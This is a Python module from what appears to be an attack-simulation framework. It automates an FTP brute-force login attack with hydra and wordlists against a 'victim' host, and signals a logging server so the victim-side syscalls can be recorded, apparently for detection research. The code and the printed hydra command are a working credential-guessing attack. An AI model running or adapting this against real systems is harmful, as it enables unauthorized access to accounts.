import sys, os, time, requests
import subprocess

class color:
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[1;36;48m'
	BOLD = '\033[1;37;48m'
	BLUE = '\033[1;34;48m'
	GREEN = '\033[1;32;48m'
	YELLOW = '\033[1;33;48m'
	RED = '\033[1;31;48m'
	BLACK = '\033[1;30;48m'
	UNDERLINE = '\033[4;37;48m'
	END = '\033[1;37;0m'

def run(victim_info, attacker_info, general_info, arguments):

	# Dont print banner if its on repeat mode
	if arguments.repeat == None:
		print(color.CYAN + '''
		##################################################################################
		#										 #
		# 	                         FTP BRUTEFORCE			 		 #		
		#										 #
		##################################################################################
		''' + color.END)
		print(color.BOLD + '''
		This attack will just try to bruteforce its way in with ftp using hydra, after getting in or reaching the end of the wordlist the program will stop.
		
		Therefore, this is simply to try to get in and then stop. You could accomplish the same by using:
			hydra -L /path/to/list/users -P /path/to/list/passwd {victim_ip} ftp -t {number_of_threads} 
		This script was implemented to automate this process and log the syscalls produced on the victim side.
		''' + color.END)
		n = input(color.YELLOW + '[?] Do you wish to proceed?' + color.END + color.BOLD + ' (y|n) ' + color.END)
		if n != 'Y' and n != 'y':
			sys.exit(color.RED +"Terminating script" + color.END)
	s = '21'
	if general_info['default_ftp'] == 'False':
		s = victim_info['ftp_port'] 
	cmd = ""
	if general_info['has_ftp_user'] == 'True':
		cmd = 'hydra -l {user} -P {wordlist} {ip} ftp -s {port} -t 16 -I\n'.format(user=victim_info['ftp_user'], wordlist=general_info['wordlist'], ip=victim_info['ip'], port=s)
	else:
		cmd = 'hydra -L {wordlist} -P {wordlist} {ip} ftp -s {port} -t 16 -I\n'.format(wordlist=general_info['wordlist'], ip=victim_info['ip'], port=s)
	
	
	process = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
	# Give time for Hydra to send the connection and ftpd create the processes
	time.sleep(0.8)
	if general_info['active'] == 'True':
			try:
				requests.get('http://'+ informAudittingStart(general_info), timeout=(1,1))
			except requests.exceptions.ReadTimeout:
		    		pass
			except requests.exceptions.ConnectTimeout:
		    		sys.exit('[-] Failed to connect to Logging server')
	process.wait()
	print(color.GREEN + '[+]' + color.END + ' Hydra Returned: ', process.returncode)
	print(color.GREEN + '[*]' + color.END + ' Exiting ...')
	if general_info['active'] == 'True':
			try:
				requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1))
			except requests.exceptions.ReadTimeout:
		    		pass
			except requests.exceptions.ConnectTimeout:
		    		sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)

def informAudittingStart(general_info):
	exploit = 'FTP'

	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit
	return url

def informAudittingStop(general_info):
	exploit = 'FTP'

	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit
	return url
